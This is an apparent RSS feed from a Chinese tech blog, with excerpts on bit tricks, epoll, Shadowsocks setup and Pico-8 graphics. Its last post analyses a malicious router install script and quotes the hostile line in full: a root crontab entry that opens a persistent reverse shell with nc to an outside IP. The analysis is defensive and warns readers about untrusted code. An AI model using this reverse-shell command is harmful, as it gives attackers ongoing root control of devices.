<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on </title>
    <link>https://geekorz.com/post/</link>
    <description>Recent content in Posts on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 05 Jun 2019 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://geekorz.com/post/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>另辟蹊径，next powof two新解法</title>
      <link>https://geekorz.com/post/next_pow_of_two/</link>
      <pubDate>Wed, 05 Jun 2019 00:00:00 +0000</pubDate>
      
      <guid>https://geekorz.com/post/next_pow_of_two/</guid>
      <description>0x0 什么是next power of 2? 给定正整数n， 求比n大的最小的2的幂次的数m
 例如：
3 -&amp;gt;4
5-&amp;gt;8
19-&amp;gt;32
 常规解法 unsigned int next_power_of_two_log(unsigned int v) { double next = pow(2, ceil(log2(v))); return (int)next; }   通俗易懂，但是慢。
 快速解法 unsigned long upper_power_of_two(unsigned long v){ v--; v |= v &amp;gt;&amp;gt; 1; v |= v &amp;gt;&amp;gt; 2; v |= v &amp;gt;&amp;gt; 4; v |= v &amp;gt;&amp;gt; 8; v |= v &amp;gt;&amp;gt; 16; v++; return v; }   仅使用了位移和位操作， 巧妙 ，快速。</description>
    </item>
    
    <item>
      <title>理解epoll中Level-triggered 和 edge-triggered</title>
      <link>https://geekorz.com/post/epoll-triggered/</link>
      <pubDate>Tue, 04 Jun 2019 23:04:56 +0800</pubDate>
      
      <guid>https://geekorz.com/post/epoll-triggered/</guid>
      <description>0x00 名词解释  Level-triggered: (electronics) Describing a circuit or component whose output is sensitive to changes of the inputs only so long as the clock input&amp;rsquo;s signal is high.
  当处于高电平状态时持续触发，在epoll中表示  读取时：如果缓存中存在未读数据则 持续 触发 写入时：fd处于可写状态则持续触发     Edge-triggered: (electronics) Describing a circuit or component which is either positive-edge-triggered or negative-edge-triggered.
  当信号有变化时触发，在epoll中表示  读取时：有新数据到来时触发，(如果缓存中存在上次没读完的数据， 但是也没有新数据到来也不会触发) 写入时：状态从不可写入变为可写时触发   0x01 举个栗子  Edge-triggered:就像是一把98k(非自动步枪)，扣下扳机后只会发射一发子弹， 即使你一直扣着扳机也没用 ，只会发射一发子弹</description>
    </item>
    
    <item>
      <title>10分钟带你飞跃GFW</title>
      <link>https://geekorz.com/post/10min-shadowsock/</link>
      <pubDate>Sun, 15 Oct 2017 00:00:00 +0000</pubDate>
      
      <guid>https://geekorz.com/post/10min-shadowsock/</guid>
      <description>0x00 热身运动 下面放了一段一个黑人叔叔和48个漂亮女孩充满爱与和平的嘿嘿嘿的故事。
 什么？你看到的是一片空白？浏览器还不停转圈圈显示加载中，那么请继续往下阅读：）
 我国由于某些原因无法正常访问国外的网站，具体原因请参考GFW的wiki页
 本文将介绍如何搭建shadowssocks来带你翻越GFW的封锁，看到墙外的风光。
0x01 准备虚拟主机 什么是虚拟主机？ 虚拟专用服务器，是指通过虚拟化技术在独立服务器中运行的专用服务器。它在我们飞跃GFW的过程中扮演了一个墙外信使的角色。
 优选稳定高速的服务器, 个人推荐vultr的vps, 点击下面的图片注册个账户吧。
 
 注册成功后用支付宝充值VPS运行资金
 因为服务器是按运行时间计费的，当你把服务器停掉（注意是destroy）后资金是不会再扣除了。
第一次充值建议选择10$的最低额度，10$够服务器运行2个月了。后面用了觉得好那就再充值呗：）
 选择左侧Servers的标签页，点击右侧➕按钮添加服务器
关于服务器选型的几点小建议
  重要VPS类型选择Vultr Cloud Compute(VC2)，不是Storage Instance，也不是Dedicated Instance。 优先选择距离比较近的地区，这样网络延时会比较小，这一点对游戏玩家及其重要，优选日本，新加坡的服务器。 运行shadowsock并不会占用很多资源所以选择便宜的机型即可，这里推荐5$每月的机型，已经稳定使用1年多了，每月1T的流量也能满足大部分的视屏需求。 服务器类型选择Ubuntu 17.10，其他版本的linux或老版本的Ubuntu可能无法正常执行下面的安装脚本。  点击deploy后服务器就开始部署了，大概要等待1min左右。去泡杯茶，回来就好啦：）
点击Manage进入管理页面。复制里面的Ip Address和Password，这是我们登陆服务器所需要的信息。  至此VPS部署完成：）
 0x02 部署shadowsocks服务端  使用ssh工具登陆服务器
 工具选择：
 windows推荐使用putty mac/linux可以直接使用终端输入命令即可登陆
ssh root@这里填写你的服务器地址   在提示输入密码的时候黏贴你复制的密码然后回车即可（PS：mac和linux在输入密码的时候是不会像windows一样有****提示密码位数的）
登陆后能看到如下信息
Welcome to Ubuntu 17.10 (GNU/Linux 4.13.0-16-generic x86_64) * Documentation: https://help.</description>
    </item>
    
    <item>
      <title>如何实现一个水面</title>
      <link>https://geekorz.com/post/show_wave/</link>
      <pubDate>Sun, 13 Aug 2017 00:00:00 +0000</pubDate>
      
      <guid>https://geekorz.com/post/show_wave/</guid>
      <description>如何在2d游戏中实现一个水面？ 水如何影响被水淹没的物体的颜色？  被水淹没的物体改变了颜色，这里处于水面以下的物体经过了一层映射，处于水面的物体经过了两层映射。颜色的映射存储在sprite-sheet中。
 水下颜色的映射关系 通过一段简单的代码获取颜色的映射关系。
function dr_image() for i=0, 15 do local x = i * 8 rectfill(x, 40, x+8, 48, i) rectfill(x, 50, x+8, 58, sget(48+i, 2)) end end  因为要表现的是绿色的水，所以大部分颜色都映射成了绿色，以及黄色。
水表面颜色的映射关系 映射代码，注意两次sget实现了颜色的两次映射：
function dr_image() for i=0, 15 do local x = i * 8 rectfill(x, 40, x+8, 48, i) local pix=sget(48+i,1)	rectfill(x, 50, x+8, 58, sget(48+pix, 2)) end end  这次大部分的颜色都被映射成了浅绿色和黄色，这就是水表面的颜色。
如何让水面波动起来？  水面的波形很像cos，sin的函数图像。还记得高中的三角函数知识么？
  其中cmx=hero.</description>
    </item>
    
    <item>
      <title>Pico8中的粒子系统 Part.1</title>
      <link>https://geekorz.com/post/ps_intro/</link>
      <pubDate>Sat, 29 Jul 2017 00:00:00 +0000</pubDate>
      
      <guid>https://geekorz.com/post/ps_intro/</guid>
      <description>什么是粒子系统 Particle system 粒子系统组成：
 发射器 发射速度 初始速度 颜色 发射速率 etc  简单的死亡爆炸特效  生成一圈小圆点，然后向外扩散，形成一个简单的爆炸效果
 单个粒子生成方法 每个粒子拥有的属性：
 当前的位置信息：x,y 粒子的sprite信息：frame 粒子的颜色：col 生存时间信息：t, max_t 速度信息：dx, dy 加速度信息：ddy
function make_sparkle(x,y,frame,col) local s = {} s.x=x s.y=y s.frame=frame s.col=col s.t=0 s.max_t = 8+rnd(4) s.dx = 0 s.dy = 0 s.ddy = 0 add(sparkle,s) return s end   粒子是怎么运动的？ 粒子的运动遵循基础的物理定律(注意不是精确的，但在此使用足矣)。
function move_sparkle(sp) if (sp.t &amp;gt; sp.max_t) then	--当粒子的到达自己的寿命的时候将被删除 del(sparkle,sp) end sp.x = sp.</description>
    </item>
    
    <item>
      <title>什么？这xi。。哦不，这代码有毒</title>
      <link>https://geekorz.com/post/gee_ss/</link>
      <pubDate>Mon, 01 Aug 2016 00:00:00 +0000</pubDate>
      
      <guid>https://geekorz.com/post/gee_ss/</guid>
      <description>起源 之前在京东上开心的买了个极路由1s，百元内的智能路由，算是比较好用的。 当前主要是用来做shadowsock透明翻墙。
但极路由经常升级，每次升级都需要重新安装shadowsock，这一点十分麻烦。
好在网上有不少大神，写了各种一键安装脚本。
自然而然就点开了google搜索，键入关键字 “极路由shadowsocks“， 再来个按时间排序：Past month，想着有没有大神已经搞定了最新升级的脚本。
熟练地点开排名前三的连接， 一看第二个连接是github，嗯，开源代码，想来比较靠谱，果断点入，查看了下README的简介，感觉比较靠谱。果断按照readme的方式安装了。
在做到第三步的时候有点不是很理解为什要去jm33.me这个网站下载shell脚本执行，明明可以直接将脚本托管到github上的嘛。到这里我也只是疑惑，由于github不时会抽风，可能作者是想给国内用户提供更好的下载速度吧，想来楼主必是好人。
安装过程一切顺利。不多赘述。
然而shadowsock的插件页面并没有显示出来，而是报了一个错误。这。。看来还是得亲自动手看看问题到底在哪儿。
可疑的nc 先看看这个curl下载的shadow.sh到底做了啥？
额，此nc非彼nc， nc全名netcat是一个功能非常强大的网络工具，从man说明中：
and much， much more嗯， 霸气侧漏的描述。
在50行中，nc连接到了45.32.253.23端口1082。查了下ip发现是日本的一个服务器。
庖丁解牛 echo &#39;*/1 * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 45.32.253.23 1082 &amp;gt;/tmp/f&#39; &amp;gt;&amp;gt; /etc/crontabs/root   由外而内地看，这行代码是echo了一个字符串，然后把它附加到了/etc/crontabs/root文件的末尾，而这个文件正是root用户的定时执行任务列表， */1 * * * *表示每隔一分钟执行一次。 每次执行什么命令呢 简单来说就是通过mkfifo命令创建一条命名管道/tmp/f，然后用cat读取管道中的内容，并使用/bin/sh执行， 并将执行结果通过nc发送到45.32.253.23的1082端口，并将从nc接收到的命令通过命名管道f将和cat再送到/bin/sh执行。相当于创造了一条从远程执行shell命令的通道。而且属于反向链接，可以穿透nat。
2&amp;gt;&amp;amp;1  表示将stderr重定向到stdout
 &amp;amp;表示等同于，即2的输出重定向并等同于1
   管道命令只处理前一个命令正确输出，不处理错误输出 管道命令右边命令，必须能够接收标准输入流命令才行。 管道触发两个子进程执行&amp;rdquo;|&amp;ldquo;两边的程序；而重定向是在一个进程内执行  我们将地址改为localhost测试一下这个命令，果然直接拿到了路由器的root权限的shell：
后记
千万不要执行来路不明的代码，刷来路不明的rom。
参考：</description>
    </item>
    
  </channel>
</rss>